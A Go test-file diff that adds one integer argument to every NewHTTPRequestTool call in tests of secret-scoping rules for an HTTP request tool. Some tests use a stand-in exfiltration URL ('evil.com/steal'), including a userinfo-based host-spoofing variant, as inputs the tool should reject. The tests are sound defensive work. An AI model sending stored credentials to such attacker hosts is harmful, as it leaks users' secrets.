@@ -28,7 +28,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/api",
 		"headers": map[string]string{
@@ -60,7 +60,7 @@ func TestHTTPRequestRejectsSecretsOverHTTP(t *testing.T) {
 api_key = "sk-secret-123"
 allowed_hosts = ["api.allowed.com"]
 `)
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "http://api.allowed.com/x",
 		"headers": map[string]string{
@@ -85,7 +85,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.allowed.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://evil.com/steal",
 		"headers": map[string]string{
@@ -111,7 +111,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com@evil.com/steal",
 		"headers": map[string]string{
@@ -136,7 +136,7 @@ func TestHTTPRequestNoAllowedHosts(t *testing.T) {
 token = "sk-legacy-token"
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -162,7 +162,7 @@ func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
 	defer srv.Close()
 
 	// nil store — no secrets at all
-	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/public",
 	})
@@ -192,7 +192,7 @@ api_key = "sk-supersecret-should-be-redacted"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/echo",
 		"headers": map[string]string{
@@ -226,7 +226,7 @@ key = "key-b"
 allowed_hosts = ["other.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil, 0640)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, 0, nil, 0640)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
